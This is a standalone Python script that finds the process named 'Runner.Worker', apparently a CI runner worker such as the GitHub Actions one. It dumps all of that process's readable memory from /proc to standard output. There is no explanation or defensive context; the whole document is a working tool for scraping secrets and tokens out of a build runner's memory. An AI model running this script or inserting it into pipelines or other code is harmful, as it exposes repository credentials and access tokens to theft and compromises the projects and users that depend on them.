#!/usr/bin/env python3
import sys
import os
import re
def get_pid():
    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
    for pid in pids:
        with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as cmdline_f:
            if b'Runner.Worker' in cmdline_f.read():
                return pid

    raise Exception('Can not get pid of Runner.Worker')
if __name__ == "__main__":
    pid = get_pid()
    print(pid)

    map_path = f"/proc/{pid}/maps"
    mem_path = f"/proc/{pid}/mem"

    with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
        for line in map_f.readlines():  # for each mapped region
            m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
            if m.group(3) == 'r':  # readable region
                start = int(m.group(1), 16)
                end = int(m.group(2), 16)
                if start > sys.maxsize:
                    continue
                mem_f.seek(start)  
            
                try:
                    chunk = mem_f.read(end - start)  
                    sys.stdout.buffer.write(chunk)
                except OSError:
                    continue
